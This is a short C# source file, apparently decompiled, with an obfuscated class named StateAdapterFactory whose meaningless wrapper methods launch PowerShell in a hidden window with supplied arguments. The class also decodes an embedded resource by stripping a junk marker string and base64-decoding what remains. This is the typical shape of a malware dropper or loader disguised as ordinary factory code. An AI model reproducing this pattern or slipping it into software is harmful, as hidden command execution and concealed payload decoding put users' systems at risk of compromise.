using System;
using System.Diagnostics;
using System.Text;
using ac.Mocks;

namespace Tsjxretch.Factories;

internal static class StateAdapterFactory
{
	private static StateAdapterFactory TestDic;

	public static Process GetMerchant(string spec)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		CompareDic(processStartInfo, "powershell");
		ViewDic(processStartInfo, spec);
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		return (Process)ReadDic(processStartInfo);
	}

	public static byte[] CalcMerchant()
	{
		byte[] object_ = (byte[])VerifyDic();
		return (byte[])AwakeDic(((string)RegisterDic(Encoding.UTF8, object_)).Replace("好不6", (string?)null));
	}

	internal static void CompareDic(object object_0, object object_1)
	{
		((ProcessStartInfo)object_0).FileName = (string)object_1;
	}

	internal static void ViewDic(object object_0, object object_1)
	{
		((ProcessStartInfo)object_0).Arguments = (string)object_1;
	}

	internal static object ReadDic(object object_0)
	{
		return Process.Start((ProcessStartInfo)object_0);
	}

	internal static bool PublishDic()
	{
		return TestDic == null;
	}

	internal static StateAdapterFactory CalculateDic()
	{
		return TestDic;
	}

	internal static object VerifyDic()
	{
		return Merchant.FindMerchant();
	}

	internal static object RegisterDic(object object_0, object object_1)
	{
		return ((Encoding)object_0).GetString((byte[])object_1);
	}

	internal static object AwakeDic(object object_0)
	{
		return Convert.FromBase64String((string)object_0);
	}
}
